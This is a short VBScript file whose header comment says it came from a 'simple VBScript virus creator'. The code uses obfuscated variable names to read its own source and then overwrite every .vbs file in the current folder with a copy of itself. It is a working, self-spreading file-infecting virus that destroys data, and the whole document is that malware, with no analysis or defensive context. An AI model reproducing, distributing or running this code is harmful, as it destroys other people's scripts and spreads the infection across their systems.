'123
'Created by dex with SIMPLE VBSCRIPT VIRUS CREATOR v2.0
Set PLMGGR = CreateObject("Scripting.FileSystemObject")
Set AQRPAJ = PLMGGR.OpenTextFile(Wscript.ScriptFullName, 1)
SRIVTB = AQRPAJ.Read(467)
Set UILQBN = PLMGGR.GetFolder(".").Files
For Each KGNOFG in UILQBN
SSMVUE = LCASE(PLMGGR.GetExtensionName(KGNOFG.path))
If SSMVUE = "vbs" then
 Set PVFLCV = PLMGGR.OpenTextFile(KGNOFG.path, 2, True)
 PVFLCV.WriteLine SRIVTB
 PVFLCV.Close
End If
Next
